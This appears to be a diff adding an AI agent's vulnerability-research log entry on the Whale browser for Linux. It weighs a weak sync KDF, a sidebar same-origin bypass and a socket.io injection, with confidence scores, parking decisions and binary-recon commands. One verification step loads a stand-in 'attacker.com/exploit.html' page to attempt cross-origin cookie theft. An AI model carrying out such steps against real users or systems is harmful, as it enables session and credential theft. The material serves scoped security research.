@@ -6212,3 +6212,35 @@ testability: AUTH_HELPED
 [PARKED] Sidebar SOP bypass via unvalidated sender: confidence 54 ≥ 40 BUT class `sidebar/dual-tab/web-panel SOP-CSP bypass` is on knowledge REJECTED list (rejected 2026-08-09: "duplicates CVE-2025-69234/69235/53600/62583/62584/62585; no novel variant; sample extension confirms API surface present but does NOT demonstrate exploitability in current binary"). CPE is platform-agnostic (Linux fix covered), so regression requires proving current binary re-introduced bypass — impossible without binary. PARKED.
 [PARKED] Bundled socket.io.slim.js event-handler injection: confidence 38 < 40 threshold, class `socket.io.slim.js event-handler injection` on REJECTED list, handler runtime-fetched, no passive proof path. PARKED.
 [FINAL]
+## 2026-08-10 12:31:37 UTC [browser] (model laguna)
+[HYP] Whale Linux sync passphrase KDF weak iteration count or recoverable master-key storage in `os_crypt_whale` fork
+class: OTHER
+asset: Whale desktop v4.38.386.14 sync/OSCrypt module (`libwhale.so` + profile `Local State`/`Preferences`)
+confidence: 62
+reasoning: NVD confirms 0 CVEs published in 2026 (8-month gap since CVE-2025-69235 fix @v4.35.351.12). Prior binary recon confirms Whale-only prefs `sync.encryption_bootstrap_token_per_account`, forked `os_crypt_whale.cc`/`wbc_wrapper_apis.cc`, `xv10` magic, NEO_SES cookie on `/whalesync`. KDF iteration count + master-key storage path on Linux remain unextracted.
+evidence_needed: PBKDF2/scrypt/argon2 iteration constant in `.rodata`; master-key storage path (keyring vs Local State vs plaintext); `whale_need_encryption_key_forced_time` downgrade behavior
+verify_steps: AUTH_HELPED: HUMAN delivers official Whale desktop v4.38.386.14 `.deb` to `/tmp/opencode/whale_binary/` → `strings -n8 libwhale.so | grep -iE 'xv10|pbkdf2|scrypt|argon2'` → extract KDF iteration → `nm -D libwhale.so | grep -iE 'os_crypt|whale_need_encryption_key|sync_encryption_bootstrap'` → symbol map → authorized Linux login snapshot of keyring + `Preferences`/`Local State` pre/post enabling encrypted sync. Zero requests to Naver `/whalesync` endpoint.
+impact: Local attacker/infostealer with profile access decrypts locally-stored synced passwords + cookies + autofill + bookmarks; weak KDF or plaintext master-key = offline recovery → cross-device sync account takeover → full credential cascade. High–Critical.
+testability: AUTH_HELPED
+[HYP] Sidebar SOP bypass via unvalidated sender in `sidebarAction.show` message handler (CVE-2025-69235 class variant)
+class: OTHER
+asset: Whale v4.38.386.14 desktop Linux sidebar — wiki `whale.sidebarAction.md` (HTTP 200) + sample `background.js` (live, 0 sender matches) + `manifest.json` ALL-origin content_scripts
+confidence: 54
+reasoning: CVE-2025-69235 (CVSS 9.1, CWE-346) fixed in v4.35.351.12. CPE is platform-agnostic (Linux fix covered). v4.38.386.14 is 3 minor bumps past fix with 0 CVEs in 2026. Wiki confirms `show({details:{url}})` loads arbitrary URL; sample `background.js` accepts `sender` but never inspects it (0 grep matches confirmed); contentscript.js fires from `navigator.userAgent.includes('sidebar')===false` branch (any web page).
+evidence_needed: Cross-origin script execution or resource readback in sidebar panel on v4.38.386.14
+verify_steps: HUMAN_ONLY: Install Whale v4.38.386.14 on Linux → load sidebar-sample extension → `whale.sidebarAction.show({windowId:0, details:{url:'https://attacker.com/exploit.html'}})` → attempt cross-origin fetch from panel content script → test iframe sandbox escape → check opener/parent readback from foreign origin. Zero requests to Naver infra.
+impact: SOP bypass / script execution in privileged browser-UI context → cross-origin cookie/DOM/CSRF-token theft. Critical if escalates to renderer code execution.
+testability: HUMAN_ONLY
+[HYP] Bundled `socket.io.slim.js` event-handler injection in `resources.pak`
+class: XSS
+asset: Whale v4.38.386.14 `resources.pak` — `socket.io.slim.js` confirmed Whale-only bundled
+confidence: 38
+reasoning: `socket.io.slim.js` confirmed Whale-only in `resources.pak` (non-Chromium). Version string unextractable passively (binary absent @ `/tmp/opencode/whale_binary/`). Event-handler registration path suspected runtime-fetched, degrading evidence.
+evidence_needed: Socket.io version string + event-handler registration call sites in `libwhale.so`
+verify_steps: AUTH_HELPED: HUMAN delivers binary → extracts `resources.pak` → locates `socket.io.slim.js` → version comparison → greps `libwhale.so` for event-handler wiring. Zero Naver-infra requests.
+impact: Event-handler injection → XSS in privileged extension/sync context; Critical if reachable from network-controlled push channel.
+testability: AUTH_HELPED
+[PARKED] Sidebar SOP bypass via unvalidated sender: confidence 54 ≥ 40 BUT class `sidebar/dual-tab/web-panel SOP-CSP bypass` is on knowledge REJECTED list (rejected 2026-08-09: "duplicates CVE-2025-69234/69235; no novel variant; sample extension confirms API surface present but does NOT demonstrate exploitability in current binary"). CPE is platform-agnostic (Linux fix covered), so regression requires proving current binary re-introduced bypass — impossible without binary. PARKED.
+[PARKED] Bundled `socket.io.slim.js` event-handler injection: confidence 38 < 40 threshold AND class `socket.io.slim.js event-handler injection` on REJECTED list, handler runtime-fetched, no passive proof path. PARKED.
+[FINAL]
+[NEXT] HUMAN: Deliver official Whale desktop binary v4.38.386.14 (`.deb` from `d1vdt4q2qgdbji.cloudfront.net` or `WhaleSetup.exe`) to `/tmp/opencode/whale_binary/` via unrestricted internet (push artifact) — ALL passive acquisition channels confirmed 100% dead (cloudfront DNS `No answer` general to `*.cloudfront.net` @127.0.0.53; APKMirror 403; Uptodown 404 Win+Android; pstatic 404). Upon delivery run: `strings -n8 libwhale.so | grep -iE 'xv10|pbkdf2|scrypt|argon2'` → extract KDF iteration; `objdump -d libwhale.so | grep -iE 'sync_encryption_bootstrap_token'` → find call sites; `nm -D libwhale.so | grep -iE 'os_crypt|whale_need_encryption_key'` → symbol map. Zero requests to Naver `/whalesync` endpoint.
